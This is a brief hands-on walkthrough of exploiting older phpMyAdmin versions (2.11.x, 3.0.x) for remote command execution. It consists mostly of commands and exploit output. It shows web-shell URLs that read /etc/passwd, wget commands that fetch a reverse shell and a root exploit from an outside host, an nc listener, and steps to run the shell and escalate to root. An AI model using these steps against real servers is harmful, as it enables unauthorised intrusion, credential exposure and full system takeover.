SQL Injection on phpMyAdmin 2.11.4, 2.11.9.3, 2.11.9.4, 3.0.0 and 3.0.1.1

1) Run the exploit against the target machine.
./php_exploit  http://mytargettest.com/phpMyAdmin/

[+] checking if phpMyAdmin exists on URL provided ...
[+] phpMyAdmin cookie and form token received successfully. Good!
[+] attempting to inject phpinfo() ...
[+] success! phpinfo() injected successfully! output saved on /tmp/exploit.29597.phpinfo.flag.html
[+] you *should* now be able to remotely run shell commands and PHP code using your browser. i.e.:
    http://mytargettest.com/phpMyAdmin//config/config.inc.php?c=ls+-l+/
    http://mytargettest.com/phpMyAdmin//config/config.inc.php?p=phpinfo();
    please send any feedback/improvements for this script to unknown.pentester<AT_sign__here>gmail.com

2)  Great, that means it worked, now you can type commands on the target machine.
  
    http://mytargettest.com/phpMyAdmin//config/config.inc.php?c=ls+-l+/var
    http://mytargettest.com/phpMyAdmin//config/config.inc.php?c=cat+/etc/passwd
    http://mytargettest.com/phpMyAdmin//config/config.inc.php?c=touch+/tmp/test
    http://mytargettest.com/phpMyAdmin//config/config.inc.php?c=ls+-l+/tmp/test 

( Make sure you can write in there and the file is there.

    http://mytargettest.com/phpMyAdmin//config/config.inc.php?c=wget+-P+/tmp+http://172.16.1.79/exploits/airwolf_reverse_shell   (Download your rev_shell)

   http://mytargettest.com/phpMyAdmin//config/config.inc.php?c=chmod+777+/tmp/airwolf_reverse_shell  (change the permissions to execute)

3) Now you have your exploit in the target machine ready to run, this exploit is just a reverse shell
   so, in my machine I run this :

   nc -l -p 8080 -vvv

4) Now I execute my reverse shell to connect to my machine
    http://mytargettest.com/phpMyAdmin//config/config.inc.php?c=/tmp/airwolf_reverse_shell
  
5) Great, now you have a shell, next step is get root.id

6) cd /tmp/ ; mkdir hack ; cd hack
   wget http://172.16.1.79/exploits/get_root
   wget http://172.16.1.79/exploits/payload.c

7) Run the exploit to get root and that's it.

chmod +x ./get_root
./get_root
